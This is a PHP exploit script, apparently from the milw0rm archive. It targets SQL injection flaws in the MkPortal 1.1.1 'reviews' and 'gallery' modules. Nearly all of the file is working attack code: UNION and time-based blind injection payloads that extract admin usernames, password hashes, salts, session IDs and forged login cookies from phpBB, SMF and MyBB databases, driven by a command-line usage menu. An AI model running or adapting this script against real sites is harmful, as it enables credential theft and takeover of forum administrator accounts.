@@ -1,0 +1,500 @@
+<?php
+
+/*
+[i] MkPortal "reviews" and "gallery" modules SQL Injection Exploit
+[i] Vulnerable versions: MkPortal <= 1.1.1
+[i] Bug discovered by: Coloss
+[i] Exploit by: Coloss
+[i] Date: 06.07.2007
+[i] This is priv8 not for kids
+
+[Notes]
+At this time MkPortal 1.1.1 is the latest stable release
+Currently implemented: phpbb, smf and mybb
+*/
+
+
+$exptime = 3600;
+$stcnt = 300000;
+$maxnull = 5;
+
+$opts = getopt("u:U:P:f:m:d:o:");
+
+$vars = array ( "phpbb", "1 UNION SELECT %s FROM phpbb_users WHERE user_id=2",
+                "phpbb_sid", "1 UNION SELECT %s FROM phpbb_sessions WHERE session_user_id=2 ORDER BY descrizione DESC LIMIT 1",
+                "smf", "1 UNION SELECT %s FROM smf_members WHERE ID_MEMBER=1",
+                "mybb", "1 UNION SELECT %s FROM mybb_users WHERE uid=1",
+);
+
+
+print
+"[i] MkPortal \"reviews\" and \"gallery\" modules SQL Injection Exploit
+[i] Vulnerable versions: MkPortal <= 1.1.1
+[i] Bug discovered by: Coloss
+[i] Exploit by: Coloss
+[i] Date: 06.07.2007
+[i] This is priv8 not for kids\n\n";
+
+
+if ($opts[u] == '')
+        die(help($argv[0]));
+
+if (!strncmp($opts[u], "http", 4))
+        $url = $opts[u];
+else
+        $url = "http://".$opts[u];
+
+if ($opts[U])
+        $user = $opts[U];
+if ($opts[P])
+        $pass = $opts[P];
+if ($opts[f])
+        $forum = $opts[f];
+if ($opts[m])
+        $met = $opts[m];
+if ($opts[o])
+        $file = $opts[o];
+if ($opts[d])
+        $dir = $opts[d];
+
+$cookies = '';
+$delay = $min = $max = $mid = 0;
+$fld1 = $fld2 = '';
+
+if (!$forum)
+        die("[X] You haven't specified any forum type!\n");
+
+echo "[+] Target: $url [$forum]\n\n";
+
+exploit();
+
+
+function exploit_gallery ($f)
+{
+        global $cookies, $url, $fld1, $fld2;
+        $sql = get_sql($f);
+        $str = "NULL,".$fld1.",".$fld2.",NULL,NULL";
+        $req = sprintf($sql, $str);
+
+        $u = $url."index.php?ind=gallery&op=edit_file&iden=".urlencode($req);
+        $html = Send($u, NULL, $cookies);
+        if (strstr($html, "ERROR: Database error"))
+                die("[X] SQL Query Error.. probably wrong table prefix\n");
+        else if (strstr($html, "<title>Error</title>"))
+                die("[X] This method failed. Try something else\n");
+
+        $var1 = get_string($html,"name=\"titolo\" value=\"","\"");
+        $var2 = get_string($html,"name=\"descrizione\" class=\"bgselect\">","<");
+
+        return ($var1." ".$var2);
+}
+
+function get_delay ($cnt, $f, $u)
+{
+        global $url, $cookies, $fld1, $fld2, $met;
+
+        $sql = get_sql($f);
+
+        if (strstr($met, "gallery"))
+                $str = "NULL,".$fld1.",".$fld2.",NULL,NULL";
+        else
+                $str = $fld1;
+
+        $inj = sprintf($sql, $str);
+
+        if (strstr($inj, "ORDER BY")) {
+                list($base, $order) = explode("ORDER BY", $inj);
+                $inj = $base."AND IF(ORD(LOWER(SUBSTR(%s,%d,1)))%s,1,BENCHMARK(%d,MD5(31337))) ORDER BY". $order;
+        }
+        else
+                $inj .= " AND IF(ORD(SUBSTR(%s,%d,1))%s,1,BENCHMARK(%d,MD5(31337)))";
+
+        $req = sprintf($inj, $fld1, 1, "=1", $cnt);
+        $u .= urlencode($req);
+
+        $start = getmicrotime();
+        Send($u, NULL, $cookies);
+        $end = getmicrotime();
+
+        $delay = intval(10 * ($end - $start));
+        return $delay;
+}
+
+function get_normaldelay ($f, $u)
+{
+        global $stcnt;
+
+        $na = get_delay(1,$f,$u);
+        $da = get_delay($stcnt,$f,$u);
+        $nb = get_delay(1,$f,$u);
+        $db = get_delay($stcnt,$f,$u);
+        $nc = get_delay(1,$f,$u);
+        $dc = get_delay($stcnt,$f,$u);
+
+        $mean_delayed = intval(($da + $db + $dc) / 3);
+        if ($mean_delayed < 2)
+                die("Failed. The Answer was too rapid, probably you have not enough privileges\n");
+        return $mean_delayed;
+}
+
+function exploit_blind ($sql, $u, $field)
+{
+        global $cookies, $stcnt, $delay, $min, $max, $mid;
+
+        $cnt = $stcnt * 4;
+
+        echo "[->] Trying to find value for '".$field."'\n";
+
+        for ($i = 1; $i < 51; $i++) {
+                for ($j = $min; $j <= $max; $j++) {
+                        if ($j == $mid)
+                                $j = 97;
+                        $req = sprintf($sql, $field, $i, "=$j", $cnt);
+                        $ur = $u.urlencode($req);
+                        $start = getmicrotime();
+                        Send($ur, NULL, $cookies);
+                        $end = getmicrotime();
+
+                        $dtime = intval(10 * ($end - $start));
+                        if ($dtime > ($delay * 2)) {
+                                $out .= chr($j);
+                                echo "[+] Current value for '".$field."' (".$i."): ".$out."\n";
+                                break;
+                        }
+                        if ($j == $max)
+                                $i = 41;
+                }
+        }
+        if ($out)
+                echo "\n[->] Found value for '".$field."': ".$out."\n\n";
+        return $out;
+}
+
+
+function exploit_gallery_blind ($f)
+{
+        global $fld1, $fld2, $url;
+
+        $str = "NULL,".$fld1.",".$fld2.",NULL,NULL";
+        $sql = get_sql($f);
+        $inj = sprintf($sql, $str);
+
+        $u = $url."index.php?ind=gallery&op=edit_file&iden=";
+
+        $var1 = exploit_init_blind($f, $u, $inj, $fld1);
+        $var2 = exploit_init_blind($f, $u, $inj, $fld2);
+
+        return ($var1." ".$var2);
+}
+
+function exploit_reviews ($f)
+{
+        global $fld1, $fld2, $url;
+
+        $u = $url."index.php?ind=reviews&op=update_file&iden=";
+        $sql = get_sql($f);
+
+        $inj = sprintf($sql, $fld1);
+        $var1 = exploit_init_blind($f, $u, $inj, $fld1);
+
+        $inj = sprintf($sql, $fld2);
+        $var2 = exploit_init_blind($f, $u, $inj, $fld2);
+
+        return ($var1." ".$var2);
+}
+
+function exploit_init_blind ($f, $u, $inj, $field)
+{
+        global $cookies, $delay, $fld1, $fld2, $mid;
+
+        if (strstr($inj, "ORDER BY")) {
+                list($base, $order) = explode("ORDER BY", $inj);
+                if ($mid == 58)
+                        $inj = $base."AND IF(ORD(LOWER(SUBSTR(%s,%d,1)))%s,BENCHMARK(%d,MD5(31337)),1) ORDER BY". $order;
+                else
+                        $inj = $base."AND IF(ORD(SUBSTR(%s,%d,1))%s,BENCHMARK(%d,MD5(31337)),1) ORDER BY". $order;
+        }
+        else {
+                if ($mid == 58)
+                        $inj .= " AND IF(ORD(LOWER(SUBSTR(%s,%d,1)))%s,BENCHMARK(%d,MD5(31337)),1)";
+                else
+                        $inj .= " AND IF(ORD(SUBSTR(%s,%d,1))%s,BENCHMARK(%d,MD5(31337)),1)";
+        }
+
+        echo "[->] Starting blind sql injection!\n";
+
+        echo "[+] Getting standard response delay... ";
+        $delay = get_normaldelay($f,$u);
+        echo $delay."ds\n\n";
+
+        $var = exploit_blind($inj, $u, $field);
+        if (strstr($f, "sid") && !$var)
+                die("[X] Probably there are more sid in the table.. so we cannot fetch it.. retry later.\n");
+
+        return $var;
+}
+
+function get_data ($f)
+{
+        global $met;
+
+        switch ($met) {
+                case 'reviews':
+                        $res = exploit_reviews($f); break;
+                case 'gallery-blind':
+                        $res = exploit_gallery_blind($f); break;
+                case 'gallery':
+                        $res = exploit_gallery($f); break;
+                default:
+                        die("[X] Invalid exploit method specified\n");
+        }
+        return $res;
+}
+
+function phpbb_exploit ()
+{
+        global $dir, $url, $user, $pass, $cookies, $forum, $exptime, $fld1, $fld2, $min, $max, $mid;
+
+        if ($user && $pass) {
+                echo "[+] Logging in... ";
+
+                $u = $url.$dir."login.php?login=true";
+                $post = "username=".$user."&password=".$pass."&redirec=portalhome&submit=Login";
+
+                $html = Send($u, $post, NULL, TRUE);
+
+                $lines = explode("\n", $html);
+
+                foreach($lines as $line) {
+                        if (strstr($line, "Set-Cookie") && strstr($line, "sid")) {
+                                $cookies = get_string($line, "Set-Cookie: ", ";");
+                                $c++;
+                        }
+                }
+                if (!$cookies || $c < 2)
+                        die("Failed\n");
+                echo "Successfull\n\n";
+        }
+
+        $fld1 = "username"; $fld2 = "user_password";
+        $min = 48; $max = 122; $mid = 58;
+
+        $res = get_data($forum);
+        list($auesr, $apwd) = explode(" ", $res);
+        if ($auser && strlen($apwd) == 32) {
+                owrite("\n[+] Target: $url [$forum]\n");
+                owrite("[->] Found admin username: '".$auser."'\n");
+                owrite("[->] Found admin hash password: '".$apwd."'\n");
+        }
+        else
+                die("[X] Failed to retrive informations\n");
+
+        $fld1 = "session_id"; $fld2 = "session_time";
+        $max = 102;
+
+        $res = get_data($forum."_sid");
+        list($sid,$start) = explode(" ", $res);
+        if ($sid && strlen($sid) == 32) {
+                $t = (int) (time() - $start - $exptime);
+                if ($t >= 0)
+                        echo "[!] Found admin sid ('".$sid."') but it should not be valid anymore\n";
+                else
+                        owrite("[->] Found admin sid: '".$sid."' valid for ~".abs($t)."s\n");
+        }
+        else
+                echo "[!] No admin sid was found\n";
+}
+
+function smf_exploit ()
+{
+        global $user, $pass, $url, $dir, $cookies, $forum, $fld1, $fld2, $min, $max;
+
+        $base = 'a:4:{i:0;s:1:"1";i:1;s:40:"%s";i:2;i:1184000000;i:3;i:0;}';
+
+        if ($user && $pass) {
+                echo "[+] Logging in... ";
+
+                $u = $url.$dir."index.php?action=login2";
+                $post = "user=".$user."&passwrd=".$pass."&cookieneverexp=on&submit=Login";
+                $html = Send($u, $post, NULL, TRUE);
+
+                $lines = explode("\n", $html);
+                foreach($lines as $line) {
+                        if (strstr($line, "Set-Cookie") && !strstr($line, "PHPSESSID"))
+                                $cookies = get_string($line, "Set-Cookie: ", ";");
+                }
+                if (!$cookies)
+                        die("Failed\n");
+                echo "Successfull\n\n";
+        }
+
+        $fld1 = "passwd"; $fld2 = "passwordSalt";
+        $min = 48; $max = 102; $mid = 58;
+
+        $res = get_data($forum);
+        list($pwd,$salt) = explode(" ", $res);
+        if ($pwd && strlen($pwd) == 40 && strlen($salt) == 4) {
+                $pass = $pwd.$salt;
+                $pass = sha1($pass);
+                $cookie = sprintf($base, $pass);
+                list($cname) = explode("=", $cookies);
+                owrite("\n[+] Target: $url [$forum]\n");
+                owrite("[+] Found admin cookie '".$cname."': '".urlencode($cookie)."'\n");
+        }
+        else
+                die("[X] Failed to retrive informations\n");
+}
+
+function mybb_exploit ()
+{
+        global $user, $pass, $url, $dir, $cookies, $forum, $fld1, $fld2, $min, $max, $mid;
+
+        if ($user && $pass) {
+                echo "[+] Logging in... ";
+
+                $u = $url.$dir."member.php";
+                $post = "username=".$user."&password=".$pass."&action=do_login&submit=Login";
+                $html = Send($u, $post, NULL, TRUE);
+
+                $lines = explode("\n", $html);
+                foreach($lines as $line) {
+                        if (strstr($line, "Set-Cookie") && !strstr($line, "PHPSESSID") && !strstr($line, "[last") && !strstr($line,  
+" sid=")) {
+                                $cookies = get_string($line, "Set-Cookie: ", ";");
+                        }
+                }
+                if (!$cookies)
+                        die("Failed\n");
+                echo "Successfull\n\n";
+        }
+
+        $fld1 = "loginkey"; $fld2 = "username";
+        $min = 48; $max = 122; $mid = 91;
+
+        $res = get_data($forum);
+        list($key,$auser) = explode(" ", $res);
+        if ($key && strlen($key) == 50) {
+                $cookie = sprintf($base, $pass);
+                list($cname) = explode("=", $cookies);
+                owrite("\n[+] Target: $url [$forum]\n");
+                owrite("[+] Found admin cookie '".$cname."': '1_".$key."'\n");
+        }
+        else
+                die("[X] Failed to retrive informations\n");
+
+        $fld1 = "password"; $fld2 = "salt";
+
+        $res = get_data($forum);
+        list($apwd,$salt) = explode(" ", $res);
+        if ($apwd && strlen($apwd) == 32 && $salt && strlen($salt) == 8) {
+                owrite("[+] Found admin hash password: '".$apwd."'\n");
+                owrite("[+] Found admin password salt: '".$salt."'\n");
+        }
+        else
+                echo "[!] No admin sid was found\n";
+}
+
+function exploit ()
+{
+        global $forum;
+
+        switch ($forum) {
+                case 'phpbb':
+                        phpbb_exploit(); break;
+                case 'smf':
+                        smf_exploit(); break;
+                case 'mybb':
+                        mybb_exploit(); break;
+                default:
+                        die("Failed. Cannot handle this type of forum\n");
+        }
+}
+
+function get_string ($str, $start, $end)
+{
+        $res = substr($str, strpos($str, $start)+strlen($start),strpos(substr($str, strpos($str, 
+$start)+strlen($start),strlen($str)), $end));
+        return $res;
+}
+
+function get_sql ($var)
+{
+        global $vars;
+
+        for ($i = 0, $j = 1; $vars[$i]; $i++, $j++) {
+                if ($vars[$i] == $var)
+                        return $vars[$j];
+        }
+}
+
+function getmicrotime()
+{
+        list($usec, $sec) = explode(" ", microtime());
+        return ((float)$usec + (float)$sec);
+}
+
+function Send($url, $post_fields='', $cookie = '', $headers = FALSE)
+{
+        $ch = curl_init();
+        $timeout = 120;
+
+        curl_setopt ($ch, CURLOPT_URL, $url);
+        curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
+
+        if ($post_fields) {
+                curl_setopt($ch, CURLOPT_POST, 1);
+                curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
+        }
+
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)');
+
+        if(!empty($cookie))
+                curl_setopt ($ch, CURLOPT_COOKIE, $cookie);
+
+        if($headers === TRUE)
+                curl_setopt ($ch, CURLOPT_HEADER, TRUE);
+        else
+                curl_setopt ($ch, CURLOPT_HEADER, FALSE);
+
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
+
+        $fc = curl_exec($ch);
+        curl_close($ch);
+
+        return $fc;
+}
+
+function owrite ($msg)
+{
+        global $file, $debug;
+
+        echo $msg;
+
+        if ($file) {
+                if (!($h = fopen($file, 'ab')) && $debug) {
+                        echo "[X] Cannot open '$file'\n";
+                        return;
+                }
+                if (fwrite($h, $msg) === FALSE && $debug)
+                        echo "[X] Cannot write to '$file'\n";
+                fclose($h);
+        }
+}
+
+function help ($prog)
+{
+        print "[-] Usage: $prog
+         -u  <url>      -> Sets Target url
+        [-U] <user>     -> Your username
+        [-P] <hash>     -> Your password
+        [-f] <type>     -> Sets Forum type (phpbb, smf or mybb)
+        [-m] <method>   -> Which method do you want to use (gallery or reviews)
+        [-d] <dir>      -> Sets forum subdirectory
+        [-o] <file>     -> Writes results to a file\n";
+}
+
+?>
+
+# milw0rm.com [2007-07-12]
